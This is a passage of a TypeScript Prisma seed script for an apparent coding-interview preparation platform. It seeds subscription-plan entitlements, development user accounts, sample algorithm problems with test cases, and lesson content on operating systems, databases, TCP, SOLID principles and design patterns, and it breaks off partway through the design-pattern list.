import { PrismaClient } from "@prisma/client";
import { PrismaPg } from "@prisma/adapter-pg";
import { Pool } from "pg";
import bcrypt from "bcryptjs";
import "dotenv/config";

const pool = new Pool({ connectionString: process.env.DATABASE_URL });
const adapter = new PrismaPg(pool);
const prisma = new PrismaClient({ adapter });

async function main() {
  console.log("Seeding database...");

  // Seed plan entitlements
  const entitlements = [
    { plan: "free", featureKey: "dsa_daily_submissions", enabled: true, limitValue: 10 },
    { plan: "free", featureKey: "dsa_library", enabled: true, limitValue: 1 },
    { plan: "free", featureKey: "core_subjects", enabled: true, limitValue: 1 },
    { plan: "free", featureKey: "visualizer", enabled: false, limitValue: null },
    { plan: "free", featureKey: "mock_interviews", enabled: false, limitValue: 0 },
    { plan: "free", featureKey: "mentorship_monthly", enabled: false, limitValue: 0 },
    { plan: "free", featureKey: "resume_pdf_export", enabled: false, limitValue: null },
    { plan: "free", featureKey: "ai_code_review", enabled: false, limitValue: null },

    { plan: "basic", featureKey: "dsa_daily_submissions", enabled: true, limitValue: 50 },
    { plan: "basic", featureKey: "dsa_library", enabled: true, limitValue: 2 },
    { plan: "basic", featureKey: "core_subjects", enabled: true, limitValue: 4 },
    { plan: "basic", featureKey: "visualizer", enabled: false, limitValue: null },
    { plan: "basic", featureKey: "mock_interviews", enabled: false, limitValue: 0 },
    { plan: "basic", featureKey: "mentorship_monthly", enabled: false, limitValue: 0 },
    { plan: "basic", featureKey: "resume_pdf_export", enabled: true, limitValue: null },
    { plan: "basic", featureKey: "ai_code_review", enabled: false, limitValue: null },

    { plan: "pro", featureKey: "dsa_daily_submissions", enabled: true, limitValue: null },
    { plan: "pro", featureKey: "dsa_library", enabled: true, limitValue: null },
    { plan: "pro", featureKey: "core_subjects", enabled: true, limitValue: null },
    { plan: "pro", featureKey: "visualizer", enabled: true, limitValue: null },
    { plan: "pro", featureKey: "mock_interviews", enabled: true, limitValue: 2 },
    { plan: "pro", featureKey: "mentorship_monthly", enabled: true, limitValue: 1 },
    { plan: "pro", featureKey: "resume_pdf_export", enabled: true, limitValue: null },
    { plan: "pro", featureKey: "ai_code_review", enabled: false, limitValue: null },

    { plan: "elite", featureKey: "dsa_daily_submissions", enabled: true, limitValue: null },
    { plan: "elite", featureKey: "dsa_library", enabled: true, limitValue: null },
    { plan: "elite", featureKey: "core_subjects", enabled: true, limitValue: null },
    { plan: "elite", featureKey: "visualizer", enabled: true, limitValue: null },
    { plan: "elite", featureKey: "mock_interviews", enabled: true, limitValue: 5 },
    { plan: "elite", featureKey: "mentorship_monthly", enabled: true, limitValue: 3 },
    { plan: "elite", featureKey: "resume_pdf_export", enabled: true, limitValue: null },
    { plan: "elite", featureKey: "ai_code_review", enabled: true, limitValue: null },
  ] as const;

  for (const e of entitlements) {
    await prisma.planEntitlement.upsert({
      where: { plan_featureKey: { plan: e.plan, featureKey: e.featureKey } },
      update: { enabled: e.enabled, limitValue: e.limitValue ?? null },
      create: e,
    });
  }
  console.log("Entitlements seeded.");

  // Seed dev users
  const hash = await bcrypt.hash("Password123!", 12);
  const users = [
    { email: "user@eyf.dev", role: "user", plan: "free" },
    { email: "pro@eyf.dev", role: "user", plan: "pro" },
    { email: "staff@eyf.dev", role: "staff", plan: "free" },
    { email: "admin@eyf.dev", role: "admin", plan: "elite" },
  ] as const;

  for (const u of users) {
    const existing = await prisma.user.findUnique({ where: { email: u.email } });
    if (!existing) {
      await prisma.user.create({
        data: {
          email: u.email,
          passwordHash: hash,
          role: u.role,
          plan: u.plan,
          security: { create: {} },
          xp: { create: {} },
          learningGoal: { create: { priorityModules: ["dsa", "core-subjects", "placement"] } },
        },
      });
    }
  }
  console.log("Users seeded.");

  // Seed sample problems
  const problems = [
    {
      slug: "two-sum",
      title: "Two Sum",
      difficulty: "easy" as const,
      topics: ["array", "hash-table"],
      planAccess: "free" as const,
      statement: `Given an array of integers \`nums\` and an integer \`target\`, return indices of the two numbers such that they add up to \`target\`.

You may assume that each input would have exactly one solution, and you may not use the same element twice.

You can return the answer in any order.`,
      examples: [
        { input: "nums = [2,7,11,15], target = 9", output: "[0,1]", explanation: "Because nums[0] + nums[1] == 9, we return [0, 1]." },
        { input: "nums = [3,2,4], target = 6", output: "[1,2]" },
      ],
      constraints: ["2 <= nums.length <= 10^4", "-10^9 <= nums[i] <= 10^9", "-10^9 <= target <= 10^9", "Only one valid answer exists."],
      hints: ["A brute force approach is O(n²). Can you do better?", "Use a hash map to store complement lookups."],
      testCases: [
        { input: "2 7 11 15\n9", expectedOutput: "0 1", isHidden: false, orderIndex: 0 },
        { input: "3 2 4\n6", expectedOutput: "1 2", isHidden: false, orderIndex: 1 },
        { input: "3 3\n6", expectedOutput: "0 1", isHidden: true, orderIndex: 2 },
      ],
    },
    {
      slug: "valid-parentheses",
      title: "Valid Parentheses",
      difficulty: "easy" as const,
      topics: ["stack", "string"],
      planAccess: "free" as const,
      statement: `Given a string \`s\` containing just the characters \`'('\`, \`')'\`, \`'{'\`, \`'}'\`, \`'['\` and \`']'\`, determine if the input string is valid.

An input string is valid if:
1. Open brackets must be closed by the same type of brackets.
2. Open brackets must be closed in the correct order.
3. Every close bracket has a corresponding open bracket of the same type.`,
      examples: [
        { input: 's = "()"', output: "true" },
        { input: 's = "()[]{}"', output: "true" },
        { input: 's = "(]"', output: "false" },
      ],
      constraints: ["1 <= s.length <= 10^4", "s consists of parentheses only '()[]{}'."],
      hints: ["Use a stack. Push opening brackets, pop and compare when you see closing brackets."],
      testCases: [
        { input: "()", expectedOutput: "true", isHidden: false, orderIndex: 0 },
        { input: "()[]{}", expectedOutput: "true", isHidden: false, orderIndex: 1 },
        { input: "(]", expectedOutput: "false", isHidden: false, orderIndex: 2 },
        { input: "([)]", expectedOutput: "false", isHidden: true, orderIndex: 3 },
        { input: "{[]}", expectedOutput: "true", isHidden: true, orderIndex: 4 },
      ],
    },
    {
      slug: "best-time-to-buy-stock",
      title: "Best Time to Buy and Sell Stock",
      difficulty: "easy" as const,
      topics: ["array", "dynamic-programming"],
      planAccess: "free" as const,
      statement: `You are given an array \`prices\` where \`prices[i]\` is the price of a given stock on the \`i\`th day.

You want to maximize your profit by choosing a single day to buy one stock and choosing a different day in the future to sell that stock.

Return the maximum profit you can achieve from this transaction. If you cannot achieve any profit, return \`0\`.`,
      examples: [
        { input: "prices = [7,1,5,3,6,4]", output: "5", explanation: "Buy on day 2 (price = 1) and sell on day 5 (price = 6), profit = 6-1 = 5." },
        { input: "prices = [7,6,4,3,1]", output: "0", explanation: "No profit possible." },
      ],
      constraints: ["1 <= prices.length <= 10^5", "0 <= prices[i] <= 10^4"],
      hints: ["Track the minimum price seen so far.", "At each step, compute profit = current price - min price so far."],
      testCases: [
        { input: "7 1 5 3 6 4", expectedOutput: "5", isHidden: false, orderIndex: 0 },
        { input: "7 6 4 3 1", expectedOutput: "0", isHidden: false, orderIndex: 1 },
        { input: "1 2", expectedOutput: "1", isHidden: true, orderIndex: 2 },
      ],
    },
    {
      slug: "longest-substring-without-repeating",
      title: "Longest Substring Without Repeating Characters",
      difficulty: "medium" as const,
      topics: ["sliding-window", "hash-table", "string"],
      planAccess: "free" as const,
      statement: `Given a string \`s\`, find the length of the longest substring without repeating characters.`,
      examples: [
        { input: 's = "abcabcbb"', output: "3", explanation: 'The answer is "abc", with the length of 3.' },
        { input: 's = "bbbbb"', output: "1", explanation: 'The answer is "b", with the length of 1.' },
        { input: 's = "pwwkew"', output: "3", explanation: 'The answer is "wke", with the length of 3.' },
      ],
      constraints: ["0 <= s.length <= 5 * 10^4", "s consists of English letters, digits, symbols and spaces."],
      hints: ["Use a sliding window with a hash set to track characters in the window."],
      testCases: [
        { input: "abcabcbb", expectedOutput: "3", isHidden: false, orderIndex: 0 },
        { input: "bbbbb", expectedOutput: "1", isHidden: false, orderIndex: 1 },
        { input: "pwwkew", expectedOutput: "3", isHidden: false, orderIndex: 2 },
        { input: "", expectedOutput: "0", isHidden: true, orderIndex: 3 },
      ],
    },
    {
      slug: "merge-intervals",
      title: "Merge Intervals",
      difficulty: "medium" as const,
      topics: ["array", "sorting"],
      planAccess: "basic" as const,
      statement: `Given an array of \`intervals\` where \`intervals[i] = [starti, endi]\`, merge all overlapping intervals, and return an array of the non-overlapping intervals that cover all the intervals in the input.`,
      examples: [
        { input: "intervals = [[1,3],[2,6],[8,10],[15,18]]", output: "[[1,6],[8,10],[15,18]]", explanation: "Since intervals [1,3] and [2,6] overlap, merge them into [1,6]." },
        { input: "intervals = [[1,4],[4,5]]", output: "[[1,5]]", explanation: "Intervals [1,4] and [4,5] are considered overlapping." },
      ],
      constraints: ["1 <= intervals.length <= 10^4", "intervals[i].length == 2", "0 <= starti <= endi <= 10^4"],
      hints: ["Sort intervals by start time.", "Iterate and merge when current interval overlaps the previous merged interval."],
      testCases: [
        { input: "1 3\n2 6\n8 10\n15 18", expectedOutput: "1 6\n8 10\n15 18", isHidden: false, orderIndex: 0 },
        { input: "1 4\n4 5", expectedOutput: "1 5", isHidden: false, orderIndex: 1 },
      ],
    },
    {
      slug: "lru-cache",
      title: "LRU Cache",
      difficulty: "hard" as const,
      topics: ["hash-table", "linked-list", "design"],
      planAccess: "pro" as const,
      statement: `Design a data structure that follows the constraints of a Least Recently Used (LRU) cache.

Implement the \`LRUCache\` class:
- \`LRUCache(int capacity)\` Initialize the LRU cache with positive size \`capacity\`.
- \`int get(int key)\` Return the value of the \`key\` if the key exists, otherwise return \`-1\`.
- \`void put(int key, int value)\` Update the value of the \`key\` if the key exists. Otherwise, add the key-value pair to the cache. If the number of keys exceeds the \`capacity\` from this operation, evict the least recently used key.

The functions \`get\` and \`put\` must each run in \`O(1)\` average time complexity.`,
      examples: [
        { input: '["LRUCache","put","put","get","put","get","put","get","get","get"]\n[[2],[1,1],[2,2],[1],[3,3],[2],[4,4],[1],[3],[4]]', output: "[null,null,null,1,null,-1,null,-1,3,4]" },
      ],
      constraints: ["1 <= capacity <= 3000", "0 <= key <= 10^4", "0 <= value <= 10^5", "At most 2 * 10^5 calls will be made to get and put."],
      hints: ["Use a doubly linked list + HashMap.", "The head of the list is MRU, tail is LRU."],
      testCases: [
        { input: "2\nput 1 1\nput 2 2\nget 1\nput 3 3\nget 2\nput 4 4\nget 1\nget 3\nget 4", expectedOutput: "1\n-1\n-1\n3\n4", isHidden: false, orderIndex: 0 },
      ],
    },
  ];

  for (const p of problems) {
    const { testCases, ...problemData } = p;
    const existing = await prisma.problem.findUnique({ where: { slug: p.slug } });
    if (!existing) {
      await prisma.problem.create({
        data: {
          ...problemData,
          testCases: { createMany: { data: testCases } },
        },
      });
    }
  }
  console.log("Problems seeded.");

  // Seed core subject content
  const subjectContent = [
    { subject: "os", topic: "process-scheduling", slug: "os-process-scheduling", title: "Process Scheduling", planAccess: "free" as const, orderIndex: 1,
      content: `# Process Scheduling

## What is Process Scheduling?
Process scheduling is the activity of the process manager that handles the removal of the running process from the CPU and the selection of another process based on a particular strategy.

## Key Algorithms

### First Come First Served (FCFS)
- Non-preemptive
- Processes are executed in the order they arrive
- Simple but may cause convoy effect

### Shortest Job First (SJF)
- Can be preemptive (SRTF) or non-preemptive
- Optimal for minimizing average waiting time
- Requires knowing burst times in advance

### Round Robin (RR)
- Preemptive
- Each process gets a fixed time quantum
- Best for time-sharing systems

### Priority Scheduling
- Each process has a priority; highest priority runs first
- Can suffer from starvation (fixed by aging)

## Key Metrics
- **Turnaround Time**: completion time - arrival time
- **Waiting Time**: turnaround time - burst time
- **Response Time**: first response - arrival time
- **CPU Utilization**: percentage of time CPU is busy

## Interview Tips
- Know how to calculate average waiting/turnaround time for each algorithm
- Understand when to use each algorithm
- SRTF is the preemptive version of SJF` },
    { subject: "os", topic: "memory-management", slug: "os-memory-management", title: "Memory Management", planAccess: "free" as const, orderIndex: 2,
      content: `# Memory Management

## Virtual Memory
Virtual memory creates the illusion that each process has its own large, contiguous address space.

## Paging
- Divide physical memory into fixed-size frames
- Divide logical memory into fixed-size pages (same size as frames)
- Page table maps logical pages to physical frames
- No external fragmentation, but internal fragmentation possible

## Segmentation
- Divide memory into variable-size segments (code, stack, heap)
- External fragmentation possible
- Better matches programmer's view

## Page Replacement Algorithms
- **FIFO**: Replace the oldest page
- **LRU**: Replace the least recently used page (optimal in practice)
- **Optimal**: Replace page that won't be used for longest time (theoretical)
- **Clock (Second Chance)**: FIFO with a reference bit

## Thrashing
When a process spends more time paging than executing. Caused by too many processes in memory or poor locality of reference.` },
    { subject: "dbms", topic: "normalization", slug: "dbms-normalization", title: "Normalization", planAccess: "free" as const, orderIndex: 1,
      content: `# Database Normalization

## Why Normalize?
Reduce data redundancy, eliminate anomalies (insertion, update, deletion), and improve data integrity.

## Normal Forms

### 1NF (First Normal Form)
- All attributes are atomic (no repeating groups or arrays)
- Each row is unique (has a primary key)

### 2NF (Second Normal Form)
- Must be in 1NF
- No partial dependencies (non-key attributes must depend on the WHOLE primary key)
- Applies to tables with composite primary keys

### 3NF (Third Normal Form)
- Must be in 2NF
- No transitive dependencies (non-key attributes must not depend on other non-key attributes)

### BCNF (Boyce-Codd Normal Form)
- Stronger version of 3NF
- For every functional dependency X → Y, X must be a superkey

## Functional Dependencies
A functional dependency X → Y means that X determines Y. Knowing the value of X, you can determine Y.

## Interview Tips
- Know how to identify and remove functional dependencies
- Understand trade-offs: normalization vs. performance (sometimes denormalization is better)
- 3NF is usually sufficient for most applications` },
    { subject: "cn", topic: "tcp-handshake", slug: "cn-tcp-handshake", title: "TCP Three-Way Handshake", planAccess: "free" as const, orderIndex: 1,
      content: `# TCP Three-Way Handshake

## What is TCP?
TCP (Transmission Control Protocol) is a connection-oriented protocol that provides reliable, ordered, and error-checked delivery of data.

## The Handshake Process

### Step 1: SYN
Client sends a SYN (synchronize) segment to the server:
- SYN flag = 1
- Sequence number = x (randomly chosen by client)

### Step 2: SYN-ACK
Server responds with SYN-ACK:
- SYN flag = 1, ACK flag = 1
- Sequence number = y (randomly chosen by server)
- Acknowledgment number = x + 1

### Step 3: ACK
Client sends ACK:
- ACK flag = 1
- Acknowledgment number = y + 1

Connection is now established!

## Four-Way Termination
TCP uses a four-way handshake to close connections:
1. Client sends FIN
2. Server sends ACK
3. Server sends FIN
4. Client sends ACK → enters TIME_WAIT state

## Why TIME_WAIT?
Ensures any delayed packets from the old connection are absorbed before a new connection on the same port pair is established.

## Key TCP Features
- **Flow Control**: Sliding window prevents receiver from being overwhelmed
- **Congestion Control**: Slow start, congestion avoidance, fast retransmit
- **Reliability**: Sequence numbers + acknowledgments + retransmission` },
    { subject: "oop", topic: "solid-principles", slug: "oop-solid-principles", title: "SOLID Principles", planAccess: "free" as const, orderIndex: 1,
      content: `# SOLID Principles

## S - Single Responsibility Principle
A class should have only one reason to change. Each class/module should focus on doing one thing well.

**Bad**: A User class that handles authentication, sends emails, AND manages database persistence.
**Good**: Separate classes — UserAuthService, UserEmailService, UserRepository.

## O - Open/Closed Principle
Software entities should be open for extension but closed for modification. Add new behavior without changing existing code.

**Approach**: Use interfaces, abstract classes, and composition over inheritance.

## L - Liskov Substitution Principle
Objects of a subclass should be substitutable for objects of the superclass without altering correctness.

**Classic violation**: Square extends Rectangle — setting width/height independently breaks the Rectangle contract.

## I - Interface Segregation Principle
Clients should not be forced to depend on interfaces they don't use. Prefer many small, specific interfaces over one large general-purpose interface.

## D - Dependency Inversion Principle
High-level modules should not depend on low-level modules. Both should depend on abstractions.

**Example**: Instead of \`UserService\` depending on \`MySQLRepository\`, both depend on a \`UserRepository\` interface.

## Why SOLID Matters
- Easier to test (decoupled, mockable dependencies)
- Easier to extend (new features don't require touching existing code)
- Easier to maintain (isolated changes)

## Design Patterns that Implement SOLID
- **Factory/Abstract Factory**: OCP, DIP
- **Strategy**: OCP, SRP
- **Observer**: SRP, OCP
- **Decorator**: OCP, SRP` },
  ];

  for (const content of subjectContent) {
    const existing = await prisma.coreSubjectContent.findUnique({ where: { slug: content.slug } });
    if (!existing) {
      await prisma.coreSubjectContent.create({ data: content });
    }
  }
  console.log("Subject content seeded.");

  // Seed SOLID Principle Lessons
  const solidLessons = [
    { principleKey: "srp", letter: "S", title: "Single Responsibility Principle", orderIndex: 1, planAccess: "free" as const,
      description: "A class should have only one reason to change. Each class should be responsible for a single part of the functionality.",
      badExample: `class User {\n  save() { /* DB logic */ }\n  sendWelcomeEmail() { /* SMTP logic */ }\n  generateReport() { /* reporting logic */ }\n}`,
      goodExample: `class UserRepository { save(user: User) { /* only DB */ } }\nclass UserEmailService { sendWelcome(user: User) { /* only email */ } }\nclass UserReportService { generate(user: User) { /* only reporting */ } }` },
    { principleKey: "ocp", letter: "O", title: "Open/Closed Principle", orderIndex: 2, planAccess: "free" as const,
      description: "Software entities should be open for extension but closed for modification. Add new behaviour by writing new code, not changing existing code.",
      badExample: `function getArea(shape: any) {\n  if (shape.type === 'circle') return Math.PI * shape.r ** 2;\n  if (shape.type === 'rect') return shape.w * shape.h;\n  // must edit this function for every new shape\n}`,
      goodExample: `interface Shape { area(): number; }\nclass Circle implements Shape { area() { return Math.PI * this.r ** 2; } }\nclass Rectangle implements Shape { area() { return this.w * this.h; } }\n// new shapes: add a class, change nothing` },
    { principleKey: "lsp", letter: "L", title: "Liskov Substitution Principle", orderIndex: 3, planAccess: "free" as const,
      description: "Objects of a subclass should be substitutable for objects of the superclass without altering correctness of the program.",
      badExample: `class Rectangle { setWidth(w: number) { this.w = w; } setHeight(h: number) { this.h = h; } }\nclass Square extends Rectangle {\n  setWidth(w: number) { this.w = this.h = w; } // breaks Rectangle contract!\n}`,
      goodExample: `interface Shape { area(): number; }\nclass Rectangle implements Shape { area() { return this.w * this.h; } }\nclass Square implements Shape { area() { return this.side ** 2; } }` },
    { principleKey: "isp", letter: "I", title: "Interface Segregation Principle", orderIndex: 4, planAccess: "free" as const,
      description: "Clients should not be forced to depend on interfaces they don't use. Prefer many small, specific interfaces over one large general-purpose interface.",
      badExample: `interface Worker {\n  work(): void;\n  eat(): void;   // robots don't eat!\n  sleep(): void; // robots don't sleep!\n}\nclass Robot implements Worker {\n  eat() { throw new Error('unsupported'); } // forced stub\n}`,
      goodExample: `interface Workable { work(): void; }\ninterface Feedable { eat(): void; sleep(): void; }\nclass Human implements Workable, Feedable { /* all methods relevant */ }\nclass Robot implements Workable { work() { /* only what's needed */ } }` },
    { principleKey: "dip", letter: "D", title: "Dependency Inversion Principle", orderIndex: 5, planAccess: "free" as const,
      description: "High-level modules should not depend on low-level modules. Both should depend on abstractions. Depend on interfaces, not concrete implementations.",
      badExample: `class UserService {\n  private repo = new MySQLUserRepository(); // concrete dependency\n  getUser(id: string) { return this.repo.findById(id); }\n  // impossible to test without real MySQL`,
      goodExample: `interface UserRepository { findById(id: string): Promise<User>; }\nclass UserService {\n  constructor(private repo: UserRepository) {} // inject abstraction\n  getUser(id: string) { return this.repo.findById(id); }\n}` },
  ];

  for (const l of solidLessons) {
    await prisma.solidPrincipleLesson.upsert({
      where: { principleKey: l.principleKey },
      update: {},
      create: l,
    });
  }
  console.log("SOLID lessons seeded.");

  // Seed Design Pattern Lessons
  const patterns = [
    // Creational
    { patternKey: "singleton", name: "Singleton", category: "Creational", orderIndex: 1, planAccess: "free" as const,
      description: "Ensure a class has only one instance and provide a global access point to it.",
      intent: "Restrict instantiation of a class to a single object and provide a global access point.",
      structure: "Private constructor + static instance field + static getInstance() method.",
      codeExample: `class Database {\n  private static instance: Database;\n  private constructor(private url: string) {}\n  static getInstance(): Database {\n    if (!Database.instance) Database.instance = new Database(process.env.DB_URL!);\n    return Database.instance;\n  }\n  query(sql: string) { /* ... */ }\n}\nconst db = Database.getInstance();`,
      useCase: "Database connection pools, logger instances, application configuration objects.",
      relatedPatterns: ["factory-method", "prototype"] },
    { patternKey: "factory-method", name: "Factory Method", category: "Creational", orderIndex: 2, planAccess: "free" as const,
      description: "Define an interface for creating objects but let subclasses decide which class to instantiate.",
      intent: "Delegate object creation to subclasses, removing the direct new call from the caller.",
      structure: "Creator class with a factory method that returns a Product interface; concrete creators override the factory method.",
      codeExample: `interface Notification { send(msg: string): void; }\nclass EmailNotification implements Notification { send(msg: string) { console.log('Email: ' + msg); } }\nclass SMSNotification implements Notification { send(msg: string) { console.log('SMS: ' + msg); } }\nclass NotificationFactory {\n  static create(type: 'email' | 'sms'): Notification {\n    return type === 'email' ? new EmailNotification() : new SMSNotification();\n  }\n}`,
      useCase: "Notification systems, plugin architectures, cross-platform UI widget creation.",
      relatedPatterns: ["abstract-factory", "prototype", "template-method"] },
    { patternKey: "abstract-factory", name: "Abstract Factory", category: "Creational", orderIndex: 3, planAccess: "free" as const,
      description: "Provide an interface for creating families of related objects without specifying concrete classes.",
      intent: "Create families of related objects that must be used together, without coupling to concrete classes.",
      structure: "Abstract factory interface with multiple create methods; concrete factories implement the interface for each product family.",
      codeExample: `interface GUIFactory { createButton(): Button; createCheckbox(): Checkbox; }\nclass WindowsFactory implements GUIFactory {\n  createButton() { return new WindowsButton(); }\n  createCheckbox() { return new WindowsCheckbox(); }\n}\nclass MacFactory implements GUIFactory {\n  createButton() { return new MacButton(); }\n  createCheckbox() { return new MacCheckbox(); }\n}\nfunction buildUI(factory: GUIFactory) {\n  const btn = factory.createButton(); // always compatible\n  const chk = factory.createCheckbox();\n}`,
      useCase: "Cross-platform UI toolkits, database abstraction layers (MySQL vs PostgreSQL drivers).",
      relatedPatterns: ["factory-method", "builder", "singleton"] },
    { patternKey: "builder", name: "Builder", category: "Creational", orderIndex: 4, planAccess: "free" as const,
      description: "Separate the construction of a complex object from its representation.",
      intent: "Build complex objects step by step using a fluent API, avoiding telescoping constructors.",
      structure: "Builder class with methods for each construction step returning `this`; a final `build()` method assembles the object.",
      codeExample: `class QueryBuilder {\n  private table = ''; private conditions: string[] = []; private limitVal?: number;\n  from(t: string) { this.table = t; return this; }\n  where(c: string) { this.conditions.push(c); return this; }\n  limit(n: number) { this.limitVal = n; return this; }\n  build(): string {\n    let q = 'SELECT * FROM ' + this.table;\n    if (this.conditions.length) q += ' WHERE ' + this.conditions.join(' AND ');\n    if (this.limitVal) q += ' LIMIT ' + this.limitVal;\n    return q;\n  }\n}\nconst sql = new QueryBuilder().from('users').where('active = true').limit(10).build();`,
      useCase: "SQL query builders, HTTP request builders, test data object creation (Test Builder pattern).",
      relatedPatterns: ["abstract-factory", "prototype"] },
    { patternKey: "prototype", name: "Prototype", category: "Creational", orderIndex: 5, planAccess: "basic" as const,
      description: "Create new objects by cloning an existing prototypical instance.",
      intent: "Reduce the cost of object creation when the type of object to create is determined at runtime and cloning is cheaper than new.",
      structure: "Cloneable interface with a clone() method; concrete prototypes implement deep or shallow copy.",
      codeExample: `interface Cloneable { clone(): this; }\nclass GameCharacter implements Cloneable {\n  constructor(public name: string, public hp: number, public skills: string[]) {}\n  clone(): this {\n    const copy = Object.create(Object.getPrototypeOf(this));\n    copy.name = this.name;\n    copy.hp = this.hp;\n    copy.skills = [...this.skills]; // deep clone array\n    return copy;\n  }\n}\nconst warrior = new GameCharacter('Warrior', 100, ['slash']);\nconst clone = warrior.clone();\nclone.name = 'Warrior II';`,
      useCase: "Game object spawning, document template cloning, caching expensive-to-create objects.",
      relatedPatterns: ["singleton", "composite", "decorator"] },
    // Structural
    { patternKey: "adapter", name: "Adapter", category: "Structural", orderIndex: 1, planAccess: "free" as const,
      description: "Convert an incompatible interface into one that clients expect.",
      intent: "Allow classes with incompatible interfaces to work together by wrapping one with an adapter that translates calls.",
      structure: "Adapter class implements the target interface and holds a reference to the adaptee, translating calls in each method.",
      codeExample: `class StripeGateway { chargeCard(cents: number, token: string): boolean { return true; } }\ninterface PaymentProcessor { pay(dollars: number, token: string): boolean; }\nclass StripeAdapter implements PaymentProcessor {\n  constructor(private stripe: StripeGateway) {}\n  pay(dollars: number, token: string): boolean {\n    return this.stripe.chargeCard(dollars * 100, token);\n  }\n}\nconst processor: PaymentProcessor = new StripeAdapter(new StripeGateway());\nprocessor.pay(19.99, 'tok_visa');`,
      useCase: "Integrating third-party APIs, wrapping legacy code, unifying multiple data source interfaces.",
      relatedPatterns: ["bridge", "decorator", "proxy"] },
    { patternKey: "decorator", name: "Decorator", category: "Structural", orderIndex: 2, planAccess: "free" as const,
      description: "Attach additional responsibilities to an object dynamically without subclassing.",
      intent: "Add behaviour to individual objects by wrapping them in decorator objects that implement the same interface.",
      structure: "Component interface implemented by both the concrete component and decorator base; decorators hold a reference to a component and delegate + extend.",
      codeExample: `interface Logger { log(msg: string): void; }\nclass ConsoleLogger implements Logger { log(msg: string) { console.log(msg); } }\nclass TimestampDecorator implements Logger {\n  constructor(private inner: Logger) {}\n  log(msg: string) { this.inner.log('[' + new Date().toISOString() + '] ' + msg); }\n}\nclass LevelDecorator implements Logger {\n  constructor(private inner: Logger, private level: string) {}\n  log(msg: string) { this.inner.log('[' + this.level + '] ' + msg); }\n}\nconst logger = new LevelDecorator(new TimestampDecorator(new ConsoleLogger()), 'INFO');\nlogger.log('Server started');`,
      useCase: "Middleware pipelines, logging/caching/auth wrappers, Java IO streams.",
      relatedPatterns: ["composite", "strategy", "proxy"] },
    { patternKey: "facade", name: "Facade", category: "Structural", orderIndex: 3, planAccess: "free" as const,
      description: "Provide a simple interface to a complex subsystem.",
      intent: "Hide subsystem complexity behind a unified, easy-to-use interface that covers the most common use cases.",
      structure: "Facade class that delegates to multiple subsystem classes; clients talk only to the facade.",
      codeExample: `class VideoDecoder { decode(f: string) { return {}; } }\nclass AudioMixer { mix(a: unknown) { return {}; } }\nclass VideoEncoder { encode(v: unknown, fmt: string) {} }\nclass VideoConverter {\n  private dec = new VideoDecoder();\n  private mix = new AudioMixer();\n  private enc = new VideoEncoder();\n  convert(file: string, format: string): string {\n    const video = this.dec.decode(file);\n    const audio = this.mix.mix(null);\n    this.enc.encode(video, format);\n    return 'output.' + format;\n  }\n}\nnew VideoConverter().convert('movie.avi', 'mp4');`,
      useCase: "Library wrappers, layered architecture entry points, SDK simplification.",
      relatedPatterns: ["abstract-factory", "mediator", "proxy"] },
    { patternKey: "proxy", name: "Proxy", category: "Structural", orderIndex: 4, planAccess: "basic" as const,
      description: "Provide a surrogate object that controls access to another object.",
      intent: "Add a layer of indirection for access control, lazy loading, logging, or caching without changing the real subject.",
      structure: "Proxy implements the same interface as the real subject, holds a reference to it, and adds cross-cutting behaviour around delegation.",
      codeExample: `interface DataService { fetchUser(id: string): Promise<{name: string}>; }\nclass RealDataService implements DataService {\n  async fetchUser(id: string) { return { name: 'Alice' }; } // expensive DB call\n}\nclass CachingProxy implements DataService {\n  private cache = new Map<string, {name: string}>();\n  constructor(private real: DataService) {}\n  async fetchUser(id: string) {\n    if (!this.cache.has(id)) this.cache.set(id, await this.real.fetchUser(id));\n    return this.cache.get(id)!;\n  }\n}`,
      useCase: "API caching layers, virtual proxies for lazy loading, protection proxies for auth.",
      relatedPatterns: ["adapter", "decorator", "facade"] },
    { patternKey: "composite", name: "Composite", category: "Structural", orderIndex: 5, planAccess: "basic" as const,
      description: "Compose objects into tree structures and treat leaves and composites uniformly.",
      intent: "Allow clients to treat individual objects and groups of objects identically through a common interface.",
      structure: "Component interface; Leaf implements it directly; Composite holds a list of children and delegates operations recursively.",
      codeExample: `interface FSItem { size(): number; }\nclass File implements FSItem { constructor(private bytes: number) {} size() { return this.bytes; } }\nclass Folder implements FSItem {\n  private children: FSItem[] = [];\n  add(item: FSItem) { this.children.push(item); }\n  size() { return this.children.reduce((s, c) => s + c.size(), 0); }\n}\nconst root = new Folder();\nroot.add(new File(100));\nconst sub = new Folder();\nsub.add(new File(200));\nroot.add(sub);\nconsole.log(root.size()); // 300`,
      useCase: "File systems, UI component trees, organisation charts, menu/submenu structures.",
      relatedPatterns: ["decorator", "iterator", "visitor"] },
    { patternKey: "bridge", name: "Bridge", category: "Structural", orderIndex: 6, planAccess: "pro" as const,
      description: "Decouple an abstraction from its implementation so both can vary independently.",
      intent: "Replace inheritance with composition to allow abstraction and implementation to evolve independently.",
      structure: "Abstraction class holds a reference to an Implementor interface; refined abstractions extend it; concrete implementors provide the low-level operations.",
      codeExample: `interface Renderer { render(shape: string): void; }\nclass SVGRenderer implements Renderer { render(s: string) { console.log('SVG:' + s); } }\nclass CanvasRenderer implements Renderer { render(s: string) { console.log('Canvas:' + s); } }\nabstract class Shape {\n  constructor(protected renderer: Renderer) {}\n  abstract draw(): void;\n}\nclass Circle extends Shape {\n  constructor(renderer: Renderer, private r: number) { super(renderer); }\n  draw() { this.renderer.render('circle r=' + this.r); }\n}\nnew Circle(new SVGRenderer(), 10).draw();`,
      useCase: "Cross-platform UI rendering, device drivers with multiple backends.",
      relatedPatterns: ["abstract-factory", "adapter"] },
    { patternKey: "flyweight", name: "Flyweight", category: "Structural", orderIndex: 7, planAccess: "pro" as const,
      description: "Use sharing to efficiently support a large number of fine-grained objects.",
      intent: "Reduce memory usage by sharing common state (intrinsic) across many objects, passing unique state (extrinsic) at use time.",
      structure: "Flyweight factory holds a pool of shared Flyweight objects; client passes extrinsic state on each call.",
      codeExample: `class TreeType { constructor(public name: string, public texture: string) {} }\nclass TreeFactory {\n  private static pool = new Map<string, TreeType>();\n  static get(name: string, tex: string): TreeType {\n    const key = name + ':' + tex;\n    if (!this.pool.has(key)) this.pool.set(key, new TreeType(name, tex));\n    return this.pool.get(key)!;\n  }\n}\n// 10k trees share 1 TreeType object\nconst trees = Array.from({ length: 10_000 }, () => ({\n  x: Math.random() * 1000, y: Math.random() * 1000,\n  type: TreeFactory.get('Oak', 'oak.png'),\n}));`,
      useCase: "Game particle systems, text rendering (glyph objects), map tile caches.",
      relatedPatterns: ["singleton", "composite"] },
    // Behavioral
